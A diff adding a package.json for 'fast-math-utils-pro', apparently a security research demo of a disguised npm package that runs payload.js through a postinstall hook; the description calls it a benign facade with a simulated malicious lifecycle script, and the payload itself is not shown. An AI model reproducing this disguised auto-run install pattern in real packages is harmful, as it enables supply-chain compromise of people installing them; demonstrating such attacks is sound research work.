@@ -1,0 +1,12 @@
+{
+  "name": "fast-math-utils-pro",
+  "version": "1.0.0",
+  "description": "High performance math calculation helpers (Benign facade with simulated malicious lifecycle script)",
+  "main": "index.js",
+  "scripts": {
+    "postinstall": "node payload.js"
+  },
+  "keywords": ["math", "utilities", "closure-security-demo"],
+  "author": "Security Research Demo",
+  "license": "MIT"
+}
